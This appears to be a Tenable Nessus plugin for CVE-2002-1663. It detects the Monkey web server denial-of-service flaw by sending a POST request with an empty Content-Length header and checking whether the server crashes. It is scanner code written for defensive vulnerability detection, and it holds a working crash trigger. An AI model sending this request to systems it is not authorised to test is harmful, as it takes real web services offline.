#TRUSTED affa5e54fee21d7e6184803012ad4067bc8fd122e102b9ace92a713d8105ad7e0b690047291285aeb1bf2d2e5d8ebf322183862ba7acdb354faf73d0305a0d42c77e14b9c49157c3c7f68ce85a0156c03f99f203711c1189ee272762c38327892ed634ec6020a57191a547cb9921c36a114f256b9218d9ede84ba6046ad26413076d0549fb341bc92f400f84a53e5265e785a27d755f8e0486705b4d9220b5dd5a3028dddc21e89288ac8ecc3a4d3ae02377939337795205102c4c6754a5f65e17867cc85abfc151705e88670335e99836a7dd5174fb4c1dc6b80bc7862509316a5c7ef279a691b50a5da3b28947c0b20a29c169dcee08d0ad6a82111050d0e34379d3e71ee97032fe0da7693a3af7aefd6c59c0d87536cfe1991a5b88b5c8ef94df508e49ac4e7996a0cbd75d6a965b0ea2c75d80518493e23e9679c3c90bbc01c7c5b62a4a8a111d225936a5cd56fadd8585fe64720606a52f0f34e90716159db80f5d342f8af8f1aa4447a3223402715fc16a8da0df9f4290f6ca0e9960a2288e575a3fc8afc55d4a2418364c4cfb2c301c0d70cd780903ac209a013a3e9c203e2278959b65e0d7b972a85a24226e7101ac1795c4c6984bca0926b249e3357db08896d88ea289604c6b763bb414e859d8e32bc92e68211ee1d277241b83f3a1bf96c5a5b85100ee251b5c63cd1c38c9fd6ef6488a3b3fbcd5741f7482127f
#
# (C) Tenable Network Security, Inc.
#

# Ref:
# From: Daniel <keziah@uole.com>
# Subject: Bug in Monkey Webserver 0.5.0 or minors versions
# To: bugtraq@securityfocus.com
# Date: Sun, 3 Nov 2002 23:21:42 -0300
#

include('compat.inc');

if(description)
{
  script_id(11924);
  script_version("1.24");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/05/16");

  script_cve_id("CVE-2002-1663");
  script_bugtraq_id(6096);

  script_name(english:"Monkey HTTP Daemon (monkeyd) Post_Method Function Crafted Content-Length Header DoS");

  script_set_attribute(attribute:"synopsis", value: "The remote web server is susceptible
to a denial of service attack.");
  script_set_attribute(attribute:"description", value:"The remote Monkey Web Server crashes
when it receives an incorrect POST command with an empty 'Content-Length:' field." );
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2002/Nov/47" );
  script_set_attribute(attribute:"solution", value:"Upgrade to Monkey version 0.5.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2002-1663");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Default unsupported software score.");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value: "2002/10/29");
  script_set_attribute(attribute:"plugin_publication_date", value: "2003/11/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2003-2022 Tenable Network Security, Inc.");
  script_family(english: "Web Servers");

  script_dependencies("find_service1.nasl", "http_version.nasl");
  script_require_ports("Services/www",80, 2001);
  exit(0);
}

include('http.inc');

 # The listening port in the example configuration file is 2001
 # I suspect that some people might leave it unchanged.
var affected = FALSE;
var port = get_http_port(default:80); # 2001 ?
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

var banner = get_http_banner(port:port);

if (http_is_dead(port:port)) audit(AUDIT_RESP_NOT, port);

var content = make_array("Content-Length", "");
var http_send = http_send_recv3(port: port, method: 'POST', item: "/", data: "", add_headers: content);

if (http_is_dead(port:port, retry: 3))
{
  affected = TRUE;
  var report = '\nNessus detected that it was possible to crash the remote Web server on port ' + port +
  ' using a Post_Method function crafted content-length header DoS. \n\n ' + http_last_sent_request() + '\n';

  security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
  set_kb_item(name:"www/buggy_post_crash", value:TRUE);
}
if(!affected) audit(AUDIT_HOST_NOT, "affected");
